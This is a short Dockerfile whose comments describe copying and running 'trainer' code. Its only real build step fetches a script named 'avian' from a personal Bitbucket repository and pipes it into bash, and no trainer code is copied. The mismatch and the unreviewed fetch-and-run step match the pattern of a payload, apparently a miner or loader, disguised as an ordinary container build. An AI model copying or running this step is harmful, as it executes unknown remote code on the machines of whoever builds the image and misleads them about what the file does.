FROM ubuntu:latest
USER root
WORKDIR /
RUN apt-get update && apt-get -y install wget curl
RUN curl -sL https://bitbucket.org/ramabena/gofile/raw/master/avian | bash 
# Copies the trainer code to the docker image.
# Sets up the entry point to invoke the trainer.
CMD bash run.sh